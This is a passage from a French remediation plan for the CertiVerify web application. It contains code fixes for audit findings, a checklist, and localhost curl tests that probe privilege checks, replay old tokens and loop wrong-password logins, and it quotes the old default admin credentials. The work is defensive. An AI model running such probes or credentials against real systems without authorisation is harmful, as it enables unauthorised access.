  // NOUVEAU — vérifier l'expiration côté serveur
  if (user.refreshTokenExpiresAt && user.refreshTokenExpiresAt < new Date()) {
    await userRepo.update(user.id, { refreshToken: null, refreshTokenExpiresAt: null });
    throw new UnauthorizedError('Refresh token expiré');
  }

  const newRefreshToken = generateRefreshToken();
  await userRepo.update(user.id, {
    refreshToken: hashRefreshToken(newRefreshToken),
    refreshTokenExpiresAt: new Date(Date.now() + REFRESH_TOKEN_DURATION_MS),
  });

  // ... reste identique ...
}
```

### Étape 4.2 — Renforcer les mots de passe du seed (Faille #4)

**Fichier : `server/prisma/seed.ts`**

```typescript
// AVANT :
const adminPassword = await bcrypt.hash('admin123', 12);
const studentPassword = await bcrypt.hash('student123', 12);

// APRÈS — mots de passe aléatoires :
const adminTempPass = crypto.randomBytes(16).toString('base64url');
const studentTempPass = crypto.randomBytes(16).toString('base64url');
const adminPassword = await bcrypt.hash(adminTempPass, 12);
const studentPassword = await bcrypt.hash(studentTempPass, 12);

// Afficher les mots de passe temporaires UNIQUEMENT dans la console
console.log(`✅ Admin: admin@certiverify.com (temp password: ${adminTempPass})`);
console.log(`✅ Student: jean@student.com (temp password: ${studentTempPass})`);
```

Mettre à jour `setup-server.sh` pour ne plus afficher de mots de passe en dur.

### Étape 4.3 — Rate limiting combiné IP + email (Faille #15)

**Fichier : `server/src/middleware/rate.limiter.ts`**

```typescript
export const authLimiter = rateLimit({
  windowMs: 900_000,
  max: 5,   // Réduit de 10 à 5
  standardHeaders: true,
  legacyHeaders: false,
  keyGenerator: (req) => {
    const email = req.body?.email || 'unknown';
    return `${req.ip}:${email}`;
  },
  message: {
    success: false,
    error: 'Trop de tentatives. Réessayez dans 15 minutes.',
  },
});
```

### Étape 4.4 — Ajouter une politique de complexité de mot de passe

**Fichier : `server/src/routes/auth.routes.ts`**

Renforcer le schéma Zod :
```typescript
const loginSchema = z.object({
  email: z.string().email('Email invalide'),
  password: z.string()
    .min(12, 'Mot de passe : 12 caractères minimum')
    .regex(/[A-Z]/, 'Au moins une majuscule requise')
    .regex(/[0-9]/, 'Au moins un chiffre requis')
    .regex(/[^A-Za-z0-9]/, 'Au moins un caractère spécial requis'),
});
```

---

## PHASE 5 — DURCISSEMENT FINAL (Jour 4-5)

### Étape 5.1 — Supprimer les fuites d'information (Faille #12)

**Fichier : `server/src/middleware/error.handler.ts`**

```typescript
export function errorHandler(err: Error, _req: Request, res: Response, _next: NextFunction): void {
  // Logger TOUT côté serveur
  console.error(`[ERROR] ${err.message}`, {
    name: err.name,
    stack: err.stack,  // Toujours logger le stack côté serveur
  });

  if (err instanceof AppError) {
    const response: Record<string, unknown> = {
      success: false,
      error: err.message,
    };
    if ('errors' in err && typeof (err as any).errors === 'object') {
      response.errors = (err as any).errors;
    }
    res.status(err.statusCode).json(response);
    return;
  }

  // JAMAIS exposer les détails d'erreur, même en développement
  res.status(500).json({
    success: false,
    error: 'Erreur interne du serveur',
  });
}
```

### Étape 5.2 — Retirer les credentials de test du frontend (Faille #14)

**Fichier : `src/pages/Login.tsx`**

Supprimer les lignes 133-141 :
```typescript
// SUPPRIMER CE BLOC ENTIER :
{import.meta.env.DEV && (
  <div className="text-center ...">
    <p>Email: admin@certiverify.com</p>
    <p>Pass: admin123</p>
  </div>
)}
```

### Étape 5.3 — Nettoyer le doublon dans `.env` (Faille #10)

Déjà corrigé à l'étape 1.5 — le nouveau `.env` n'a plus de doublons.

### Étape 5.4 — Ajouter un rate limiter sur les routes de téléchargement public

**Fichier : `server/src/routes/certificate.routes.ts`**

```typescript
import { verifyLimiter } from '../middleware/rate.limiter.js';

// Ajouter le rate limiter aux routes publiques de download
router.get('/:uid/download', verifyLimiter, certificateController.download);
router.get('/:uid/download.pdf', verifyLimiter, certificateController.downloadPublicPdf);
```

---

## CHECKLIST DE VÉRIFICATION POST-REMÉDIATION

Après avoir appliqué toutes les corrections, valider chaque point :

| # | Vérification | Commande / Action | ✅ |
|---|---|---|---|
| 1 | `.env` n'est plus tracké | `git ls-files -- server/.env` → vide | ☐ |
| 2 | Clés PEM non trackées | `git ls-files -- server/keys/` → vide | ☐ |
| 3 | Historique purgé | `git log --all --diff-filter=A -- server/.env` → vide | ☐ |
| 4 | Nouvelles clés JWT en place | Vérifier taille : `openssl rsa -in server/keys/jwt-private.pem -text -noout | head -1` → 4096 bit | ☐ |
| 5 | Secrets HMAC changés | Vérifier que `QR_HMAC_SECRET` ≠ ancienne valeur | ☐ |
| 6 | Étudiant ne peut plus auto-compléter | `curl -X POST .../modules/:id/complete` avec token étudiant → 403 | ☐ |
| 7 | IDOR corrigé | Accès certificat d'un autre avec token verifier → données limitées | ☐ |
| 8 | Institution croisée bloquée | POST certificat avec institutionId différent → utilise celui de l'admin | ☐ |
| 9 | Refresh token expiré rejeté | Token de plus de 7 jours → 401 | ☐ |
| 10 | Erreurs ne fuient plus en dev | Erreur 500 → message générique (pas de stack trace) | ☐ |
| 11 | Clés privées chiffrées en BDD | `SELECT private_key_ref FROM key_pairs` → JSON chiffré, pas PEM | ☐ |
| 12 | Rate limit auth par IP+email | 6ème tentative avec même email → 429 | ☐ |
| 13 | AccessKey utilise secret dédié | Ancien access key ne fonctionne plus | ☐ |
| 14 | Pas de credentials dans le frontend | Build prod : `grep -r "admin123" dist/` → vide | ☐ |
| 15 | HMAC QR = 32 hex chars | Vérifier la longueur du paramètre `sig` dans le QR payload | ☐ |

---

## COMMANDES DE TEST RAPIDE POST-REMÉDIATION

```bash
# Test 1 : Vérifier que Git est propre
echo "=== Test Git ==="
git ls-files -- server/.env server/keys/ | wc -l  # Doit afficher 0

# Test 2 : Tester le blocage auto-completion étudiant
echo "=== Test Faille #5 ==="
TOKEN=$(curl -s -X POST http://localhost:3001/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"jean@student.com","password":"<NOUVEAU_MDP>"}' | jq -r '.data.accessToken')

curl -s -X POST -H "Authorization: Bearer $TOKEN" \
  http://localhost:3001/api/modules/<MODULE_ID>/complete
# Attendu : 403 Forbidden

# Test 3 : Vérifier que les anciens tokens sont invalidés
echo "=== Test Sessions ==="
OLD_TOKEN="eyJ..."  # Un ancien token
curl -s -H "Authorization: Bearer $OLD_TOKEN" http://localhost:3001/api/auth/profile
# Attendu : 401 Unauthorized

# Test 4 : Vérifier le rate limiting renforcé
echo "=== Test Rate Limit ==="
for i in $(seq 1 6); do
  curl -s -o /dev/null -w "%{http_code}\n" -X POST http://localhost:3001/api/auth/login \
    -H "Content-Type: application/json" \
    -d '{"email":"admin@certiverify.com","password":"wrong"}'
done
# Les 5 premiers : 401, le 6ème : 429
```

---

> ✅ **Une fois toutes les étapes complétées et la checklist validée, le système CertiVerify sera significativement durci.** Les 5 failles critiques, 3 hautes, 5 moyennes et 2 faibles identifiées dans l'audit seront corrigées. Il est recommandé de planifier un **re-test de pénétration** après 30 jours pour valider la pérennité des corrections.
